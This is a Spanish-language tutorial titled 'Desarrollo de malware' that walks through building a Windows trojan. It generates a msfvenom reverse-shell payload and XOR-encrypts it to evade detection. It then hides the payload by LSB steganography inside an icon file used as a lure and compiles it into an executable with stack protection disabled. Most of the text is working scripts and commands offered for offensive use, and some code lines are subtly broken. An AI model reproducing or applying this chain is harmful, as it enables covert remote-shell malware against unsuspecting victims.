## DESARROLLO DE MALWARE BY @N3XU5_666

- Dependencias
```bash
apt update && apt upgrade
apt install curl python
python3 -m pip install pillow wave numpy
```
NOTE: en Termux numpy se instala desde APT y python se ejecuta sin el '3'
- Descarga de imagen .ico
```bash
curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o pornhub.ico
```

- Payload|Shellcode:
```bash
msfvenom -p windows/x86/shell_reverse_tcp LHOST 0.0.0.0 LPORT 0000 -f raw -o shellcode.bin
```

- File xor.py
```python
import sys

def xor(inputData, encKey):

  encKey = str(encKey)
  l = len(encKey)
  outStr = b""

  for i in range(len(inputData)):
    cde = inputData[i]
    ck = encKey[i % len(encKey)]
    outStr += chr(cde ^ ord(ck)).encode('latin-1')

  return outStr

if name == "main":

  ENCRYPT_KEY = "wubbalubbadubdub"
  try:
    plainText = open(sys.argv[1], "rb").read()
    cipherText = xor(plainText, ENCRYPT_KEY)
    open("encrypted.bin", "wb").write(cipherText)
  except:
    print(f"Usage: python3 {sys.argv[0]} <payload file>")
    sys.exit(1)
```

- Encrypt payload :
```bash
python xor.py shellcode.bin #Crea un archivo llamado encrypted.bin
```

- Archivo lsb.py
```python
from PIL import Image
from pydub import AudioSegment
import numpy as np
import wave
import sys

def printHelp():

  print(f"""
Usage:


Hide message:

python3 {sys.argv[0]} -hide <image path> <message file> <output image path>


Unhide message:

python3 {sys.argv[0]} -extract <image path>
      """)

def hideBits(orig, msgFile, dest):

  img = Image.open(orig,'r')
  width, height = img.size
  array = np.array(list(img.getdata()))
  if img.mode == 'RGB':
    n = 3
  elif img.mode == 'RGBA':
    n = 4
  total_pixels = array.size//n
  message = open(msgFile, "rb")
  message = message.read()
  message += b"$end_of_message$"
  b_message = ''.join([format(i, "08b") for i in message])
  req_pixels = len(b_message)
  if req_pixels > total_pixels:
    print("ERROR: Need larger file size")
  else:
    index = 0
    for p in range(total_pixels):
      for q in range(0,3):
        if index < req_pixels:
          array[p][q] = int(bin(array[p][q])[2:9] + b_message[index],2)
          index += 1
    array = array.reshape(height, width, n)
    enc_img = Image.fromarray(array.astype('uint8'), img.mode)
    enc_img.save(dest)
    print("\nHidden message successfully!\n")

def extract(path):

  img = Image.open(path, 'r')
  array = np.array(list(img.getdata()))
  if img.mode == 'RGB':
    n = 3
  elif img.mode == 'RGBA':
    n = 4
  total_pixels = array.size//n
  hidden_bits = ""
  for p in range(total_pixels):
    for q in range(0,3):
      hidden_bits += (bin(array[p][q])[2:][-1])
  hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]
  message = b""
  for i in range(len(hidden_bits)):
    if message[-16:] == b"$end_of_message$":
      break
    else:
      message += chr(int(hidden_bits[i],2)).encode('latin-1')
  dstFile = open("message.bin", "wb")
  if b"$end_of_message" in message:
    dstFile.write(message[:-16])
    print("\nUnhidden message successfully!\n")
  else:
    print("\nNo Hidden Message Found\n")

if name == "main":

  if len(sys.argv) != 5 and len(sys.argv) != 3:
    printHelp()
    sys.exit(1)
  if sys.argv[1] != "-hide" and sys.argv[1] != "-extract":
    printHelp()
    sys.exit(1)
  if sys.argv[1] == "-hide":
    if len(sys.argv) != 5:
      printHelp()
      sys.exit(1)
    hideBits(sys.argv[2], sys.argv[3], sys.argv[4])
  else:
    if len(sys.argv) != 3:
      printHelp()
      sys.exit(1)
    extract(sys.argv[2])
```
- Inyecta el shellcode en la imagen
```bash
python3 -hide pornhub.ico shellcode.bin pornhublsb.ico
```
- Extrae el shellcode de la imagen
```bash
python3 -extract pornhublsb.ico # Crea archivo message.bin
```
#### REFERENCIAS :
| [SHELLCODES](http://shell-storm.org/shellcode/index.html) | Shellcodes pre-creados |
| [DONUT](https://github.com/TheWover/donut) | Convierte codigo cpp compilado a shellcode |

## SCRIPTS EN BATCH PARA COMPILAR TROJANO
Proceso desde SO Windows
- Compilador (VS-code) FILE: compile.bat
```
@ECHO OFF

rc resources.rc
cvtres /nologo /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /0x /MI /W0 /GS- /DNDBUG /Tp trojan.cpp /Link /OUT:resources.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
```
#### REFERENCIAS :
[COMPILER-FLAGS](https://learn.microsoft.com/en-us/cpp/build/reference/compiler-options-listed-alphabetically?view=msvc-170) | Banderas de compilacion. Se pueden modificar en base al compilador a usar.

- resources.rc
```
#include "resources.h"

MY_ICON RCDATA pornhublsb.ico
```
- resources.h
```
#define My_ICO 200
```
- trojan1.cpp
```
Pendiente para la siguiente sesion de sabado 10/12/2022
```
- Proceso de compilacion desde el x64 Native Tools Command Prompt for Visual Studio
Los native tools ya vienen instalados al instalar [FLARE-VM](https://github.com/mandiant/flare-vm) | Software de Analisis de malware
```
compile.bat 
```

#### Sigueme en todas las [Redes_Sociales](https://wlo.link/@Ivam3)
#### Sigue a N3XU5 en [Telegram](https://t.me/N3XU5_666). [Canal_CyberneticOps](https://t.me/CyberneticOps), [Canal_CyberOps](https://t.me/CyberOpsChannel), & [YouTube](https://www.youtube.com/@N3XU5_666)
#### ASISTE al proximo [LIVESTREAM](https://t.me/Ivam3byCinderella?livestream)
